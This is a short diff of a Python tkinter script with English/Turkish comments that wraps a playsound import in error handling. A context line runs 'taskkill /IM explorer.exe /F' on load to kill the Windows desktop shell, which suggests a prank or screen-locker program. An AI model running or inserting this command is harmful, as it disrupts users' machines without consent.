@@ -26,9 +26,12 @@ lang="" # (for setting language / dil ayarlamak için)
 # OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
 # SOFTWARE.
 
-from playsound import playsound # only use version 1.2.2 / sadece 1.2.2 sürümünü kullanın
 from tkinter import *
 from tkinter import messagebox
+try:
+    from playsound import playsound # only use version 1.2.2 / sadece 1.2.2 sürümünü kullanın
+except:
+    messagebox.showerror("Error","Failed to import Playsound module.")
 import subprocess
 import random
 subprocess.Popen("taskkill /IM explorer.exe /F", shell=True) # for killing explorer / explorer öldürmek için
